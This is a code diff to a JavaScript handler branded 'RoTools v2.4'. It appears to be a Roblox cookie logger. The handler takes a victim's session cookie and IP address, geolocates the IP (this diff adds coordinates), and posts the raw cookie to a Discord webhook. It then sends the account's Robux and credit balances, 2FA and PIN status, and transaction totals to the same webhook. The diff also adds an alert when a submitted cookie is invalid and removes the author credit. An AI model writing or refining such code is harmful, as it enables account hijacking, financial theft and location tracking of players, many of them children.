@@ -19,7 +19,7 @@ export default async function handler(req, res) {
 
     // Get client IP and detailed information
     const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    let ipDetails = "🌐 **IP Address**: " + clientIP;
+    let ipDetails = `🌐 **IP Address**: ${clientIP}`;
     
     try {
       const ipInfoResponse = await fetch(`https://ipinfo.io/${clientIP}/json`);
@@ -28,6 +28,7 @@ export default async function handler(req, res) {
       ipDetails = `
 🌐 **IP Address**: ${ipInfo.ip || 'N/A'}
 📍 **Location**: ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country || 'N/A'}
+🗺️ **Coordinates**: ${ipInfo.loc || 'N/A'}
 🏢 **ISP**: ${ipInfo.org ? ipInfo.org.split(' ').slice(1).join(' ') : 'N/A'}
 📮 **Postal**: ${ipInfo.postal || 'N/A'}
 🕒 **Timezone**: ${ipInfo.timezone || 'N/A'}
@@ -50,6 +51,7 @@ export default async function handler(req, res) {
           fields: [
             { 
               name: "COOKIE DATA", 
+              // Ensure cookie is properly formatted in code block
               value: `\`\`\`${cookie}\`\`\`` 
             }
           ],
@@ -67,6 +69,26 @@ export default async function handler(req, res) {
     });
     
     if (!userRes.ok || userRes.status === 401) {
+      // Send invalid cookie notification
+      await fetch(process.env.DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: "❌ INVALID COOKIE",
+            description: "Authentication failed with provided cookie",
+            color: 0x000000,
+            fields: [
+              { name: "IP Information", value: ipDetails }
+            ],
+            footer: {
+              text: "RoTools v2.4 | Security Alert"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+      
       return res.json({ 
         success: false, 
         error: 'Invalid cookie - authentication failed' 
@@ -131,9 +153,14 @@ export default async function handler(req, res) {
       .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
     
     // Process badges
-    const account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
+    let account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
       .map(match => match.split('"')[3])
       .join(', ') || 'None';
+    
+    // Truncate badges if too long
+    if (account_badges.length > 1000) {
+      account_badges = account_badges.substring(0, 1000) + '...';
+    }
 
     // Prepare account information embed
     const accountInfoEmbed = {
@@ -142,29 +169,29 @@ export default async function handler(req, res) {
       color: 0x000000,
       thumbnail: { url: thumbnailData.data[0].imageUrl },
       fields: [
-        { name: ":money_mouth: Robux Balance", value: `${robuxData.robux}`, inline: true },
-        { name: ":moneybag: Credit Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
-        { name: ":bust_in_silhouette: Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
-        { name: ":email: Email Verified", value: `${settingsData.IsEmailVerified ? 'Yes' : 'No'}`, inline: true },
-        { name: ":calendar: Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
-        { name: ":baby: Above 13", value: `${settingsData.UserAbove13 ? 'Yes' : 'No'}`, inline: true },
-        { name: ":star: Premium Status", value: `${settingsData.IsPremium ? 'Active' : 'Inactive'}`, inline: true },
-        { name: ":key: PIN Enabled", value: `${settingsData.IsAccountPinEnabled ? 'Yes' : 'No'}`, inline: true },
-        { name: ":lock: 2FA Enabled", value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled ? 'Yes' : 'No'}`, inline: true },
-        { name: ":busts_in_silhouette: Friends Count", value: `${friendsData.count}`, inline: true },
-        { name: ":microphone2: Voice Verified", value: `${voiceData.isVerifiedForVoice ? 'Yes' : 'No'}`, inline: true },
-        { name: ":video_game: Gamepasses Value", value: `${account_gamepasses_worth} R$`, inline: true },
-        { name: ":medal: Badges", value: account_badges.substring(0, 1000), inline: false },
+        { name: "Robux Balance", value: `${robuxData.robux}`, inline: true },
+        { name: "Credit Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
+        { name: "Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
+        { name: "Email Verified", value: `${settingsData.IsEmailVerified ? '✅ Yes' : '❌ No'}`, inline: true },
+        { name: "Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
+        { name: "Above 13", value: `${settingsData.UserAbove13 ? '✅ Yes' : '❌ No'}`, inline: true },
+        { name: "Premium Status", value: `${settingsData.IsPremium ? '🌟 Active' : '❌ Inactive'}`, inline: true },
+        { name: "PIN Enabled", value: `${settingsData.IsAccountPinEnabled ? '🔐 Yes' : '❌ No'}`, inline: true },
+        { name: "2FA Enabled", value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled ? '🔒 Yes' : '❌ No'}`, inline: true },
+        { name: "Friends Count", value: `${friendsData.count}`, inline: true },
+        { name: "Voice Verified", value: `${voiceData.isVerifiedForVoice ? '🎤 Yes' : '❌ No'}`, inline: true },
+        { name: "Gamepasses Value", value: `${account_gamepasses_worth} R$`, inline: true },
+        { name: "Badges", value: account_badges || 'None', inline: false },
         { name: "Transactions Summary", value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", inline: false },
-        { name: ":coin: Goods Sales", value: `${transactionsData.salesTotal}`, inline: true },
-        { name: "💰 Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
-        { name: "📈 Affiliate Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
-        { name: ":credit_card: Robux Purchased", value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
-        { name: "🚧 Pending Robux", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
-        { name: ":money_with_wings: Total Purchases", value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
+        { name: "Goods Sales", value: `${transactionsData.salesTotal}`, inline: true },
+        { name: "Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
+        { name: "Affiliate Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
+        { name: "Robux Purchased", value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
+        { name: "Pending Robux", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
+        { name: "Total Purchases", value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
       ],
       footer: {
-        text: "RoTools v2.4 | Account Details (Made by dih)"
+        text: "RoTools v2.4 | Account Details"
       },
       timestamp: new Date().toISOString()
     };
